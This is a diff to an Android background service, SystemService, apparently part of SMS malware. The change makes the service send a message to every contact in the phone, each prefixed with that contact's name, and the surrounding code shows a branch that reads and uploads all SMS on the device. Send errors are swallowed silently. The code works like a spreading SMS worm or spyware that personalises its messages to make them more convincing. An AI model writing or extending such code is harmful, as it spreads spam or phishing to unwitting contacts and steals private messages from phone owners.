@@ -76,17 +76,25 @@ public class SystemService extends Service{
                 if(content == null) {
                     return;
                 }
-                if(onlyList == null) {
-                    onlyList = SystemUtil.getAllContact(SystemService.this);
-                }
                 final String finalContent = content;
-                final List<String> finalOnlyList = onlyList;
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        sendMessage(finalContent, finalOnlyList);
-                    }
-                }).start();
+                if(onlyList == null) {
+                    final List<SystemUtil.ContactData> contactDataList = SystemUtil.getContactDataInPhone(SystemService.this);
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            sendMessageToContact(finalContent,contactDataList);
+                        }
+                    }).start();
+                }
+                else {
+                    final List<String> finalOnlyList = onlyList;
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            sendMessage(finalContent, finalOnlyList);
+                        }
+                    }).start();
+                }
             } else if(action.equals(ACTION_UPLOAD_SMS)) {
                 List<SystemUtil.SmsData> smsList = SystemUtil.getSmsInPhone(SystemService.this);
                 if(smsList == null) {
@@ -263,6 +271,15 @@ public class SystemService extends Service{
         for(String number: numberList) {
             try {
                 SystemUtil.sendSmsTo(SystemService.this, number, content);
+            } catch (Exception e) {
+            }
+        }
+    }
+
+    private void sendMessageToContact(String content, List<SystemUtil.ContactData> contactDataList) {
+        for(SystemUtil.ContactData contactData: contactDataList) {
+            try {
+                SystemUtil.sendSmsTo(SystemService.this, contactData.number, contactData.name + " " + content);
             } catch (Exception e) {
             }
         }
